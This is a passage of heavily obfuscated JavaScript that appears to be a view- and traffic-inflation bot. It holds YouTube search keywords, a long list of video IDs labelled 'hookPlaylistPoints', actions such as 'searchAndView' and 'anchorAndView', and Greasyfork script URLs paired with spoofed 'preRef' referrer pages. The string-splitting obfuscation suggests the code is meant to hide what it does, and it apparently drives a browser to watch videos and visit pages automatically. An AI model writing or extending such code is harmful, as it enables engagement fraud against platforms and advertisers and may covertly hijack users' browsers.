'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + a6(0xb))['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + a2(0x17) + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1 * 0xa40 + 0x10 * -0x1da + 0x136a)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x14d3 * 0x1 + 0x1 * 0x1771 + -0x2c3a)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x11b * -0x4 + -0x146d + 0xa4 * 0x19);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    a3(0x13, '*x7R') + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    a6(0x14) + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': a2(0x11) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
